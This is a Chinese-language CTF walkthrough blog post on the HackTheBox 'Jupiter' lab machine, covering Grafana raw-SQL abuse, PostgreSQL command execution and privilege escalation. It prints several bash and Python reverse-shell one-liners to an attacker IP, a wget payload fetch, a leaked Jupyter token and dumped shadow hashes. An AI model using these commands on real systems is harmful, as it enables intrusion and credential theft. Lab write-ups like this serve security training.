---
title: Jupiter - HackTheBox
url: https://darkwing.moe/2023/06/05/Jupiter-HackTheBox/
source: 喵喵喵喵
date: 2023-06-06
fetch_date: 2025-10-04T11:44:14.539379
---

# Jupiter - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Jupiter - HackTheBox

# Jupiter - HackTheBox

##### 2023-06-05

#### TOC

1. [1. 基本信息](#基本信息)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
3. [3. 子域名扫描](#子域名扫描)
   1. [3.1. kiosk](#kiosk)
4. [4. Grafana](#Grafana)
   1. [4.1. postgresql to shell](#postgresql-to-shell)
   2. [4.2. 信息](#信息)
5. [5. user flag](#user-flag)
6. [6. 信息](#信息-1)
7. [7. jovian](#jovian)
8. [8. 提权信息](#提权信息)
   1. [8.1. 预期](#预期)
9. [9. 提权 & root flag](#提权-amp-root-flag)
   1. [9.1. shadow](#shadow)
10. [10. 参考资料](#参考资料)

# Jupiter - HackTheBox

2023-06-05

# 基本信息

* <https://app.hackthebox.com/machines/Jupiter>
* 10.10.11.216

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060501.jpg)

# 端口扫描

22和80:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.216 Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-05 15:20 CST Nmap scan report for 10.10.11.216 Host is up (0.11s latency). Not shown: 998 closed tcp ports (conn-refused) PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   256 ac:5b:be:79:2d:c9:7a:00:ed:9a:e6:2b:2d:0e:9b:32 (ECDSA) |_  256 60:01:d7:db:92:7b:13:f0:ba:20:c6:c9:00:a7:1b:41 (ED25519) 80/tcp open  http    nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://jupiter.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 42.00 seconds ``` |

## 80

需要加hosts：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.216 jupiter.htb ``` |

一个天文学相关的官网：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060502.jpg)

# 子域名扫描

子域名扫描发现kiosk:

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://jupiter.htb/" -H 'Host: FUZZ.jupiter.htb' -fs 178  [Status: 200, Size: 34390, Words: 2150, Lines: 212, Duration: 116ms]     * FUZZ: kiosk ``` |

## kiosk

同样加hosts后访问,是一个grafana：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060503.jpg)

# Grafana

直接查看history，发现query请求里直接使用rawSql：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060504.jpg)

直接修改sql语句，发现是postgresql：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060505.jpg)

## postgresql to shell

postgresql可以直接执行操作系统命令：

* Command Execution with PostgreSQL Copy Command | by Nairuz Abulhul | R3d Buck3T | Medium
  <https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767>

|  |  |
| --- | --- |
| ``` 1 ``` | ``` CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.10.14.3/4444 0>&1\"' ``` |

打到postgres shell：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060506.jpg)

然后直接写入公钥方便后续操作

## 信息

运行pspy之类会发现/dev/shm/network-simulation.yml文件,并且我们有写入权限：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060507.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060508.jpg)

那就可以修改其中内容来执行其他命令

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` cd /dev/shm wget http://10.10.14.3:7777/network-simulation.yml -O network-simulation.yml ``` |

例如复制一个bash加suid：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060510.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060511.jpg)

小坑，目标目录是/dev/shm的时候，复制和加suid都成功，执行无效，换成tmp目录就正常了，euid是juno，但还是读不了user,因为user.txt的权限设置

但可以修改定时执行的sh文件：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` /tmp/bash -p  /bin/bash -i >& /dev/tcp/10.10.14.3/4444 0>&1 ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060512.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060513.jpg)

然后juno用户也坑，应该是故意设置的，写公钥后也不能ssh

# user flag

所以只能在juno的reverse shell里读user.txt：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060514.jpg)

# 信息

juno用户在science组，本地发现开放有8888端口，转发出来访问是一个jupyter，需要token：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` ssh postgres@10.10.11.216 -L 8888:127.0.0.1:8888 ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060515.jpg)

直接在对应日志里得到最新的token：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` grep -rie token /opt/solar-flares/logs | sort  /opt/solar-flares/logs/jupyter-2023-06-05-09.log:     or http://127.0.0.1:8888/?token=0f57278de120afc999f9f46f889c33c58289cdc1b26a6cb9 ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060516.jpg)

# jovian

jupyter可以运行任意Python代码(用不同的端口避免前面juno那个sh文件里的干扰)：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` import os; os.system('bash -c "bash -i >& /dev/tcp/10.10.14.3/4445 0>&1"'); ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060517.jpg)

得到的是jovian用户，写公钥方便后续操作

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060518.jpg)

# 提权信息

可以sudo运行sattrack文件，这个文件当前用户有写权限可以直接修改：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060519.jpg)

## 预期

文件权限设置错误导致的非预期，预期是strace发现sattrick从/tmp读取配置，并且有一个默认配置文件，复制过去，修改其中URL来写入本地文件:

* HackTheBox - Jupiter - YouTube
  <https://www.youtube.com/watch?v=HOvVjVw3pww&ab_channel=IppSec>

# 提权 & root flag

那就可以直接复制个bash：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060520.jpg)

## shadow

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` root:$y$j9T$IW34JPHywVa4Fs590kLAs1$L2hNBUYic4PnYnxpIGE7HXzv.DaeGC4eLE9KJOU6f77:19482:0:99999:7::: juno:$y$j9T$6lgwfUNA28oEIGEaZqFAE.$jpCxLf9xwuwFgO695XVQql6Ol8zLonhGWeMUb./7zFB:19482:0:99999:7::: jovian:$y$j9T$upCjEbA.hevRmruvd2qhK/$l3vTld/sG3XJO9/aYPjGPsqNiqB3F50CXkheKDax0e6:19423:0:99999:7::: ``` |

# 参考资料

* Command Execution with PostgreSQL Copy Command | by Nairuz Abulhul | R3d Buck3T | Medium
  <https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767>
* HackTheBox - Jupiter - YouTube
  <https://www.youtube.com/watch?v=HOvVjVw3pww&ab_channel=IppSec>

> Last updated: 2023-10-23 11:09:14
>
> 水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
>
> [![暗羽](/img/avatar.jpg)
> 暗羽](https://darkwing.moe)

* [HackTheBox](/tags/HackTheBox/)

[Prev

#### TwoMillion - HackTheBox](/2023/06/07/TwoMillion-HackTheBox/)

[Next

#### Bookworm - HackTheBox](/2023/05/29/Bookworm-HackTheBox/)

站点总访客数：

站点总访问量：

This blog is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).

暗羽 © 2014 - 2025

Power by [Hexo](http://hexo.io/) Theme [indigo](https://github.com/yscoder/hexo-theme-indigo)

扫一扫，分享到微信

![微信分享二维码](data:image/png;base64...)

- [{title}

  {tags}

  {date}](%7Bpath%7D)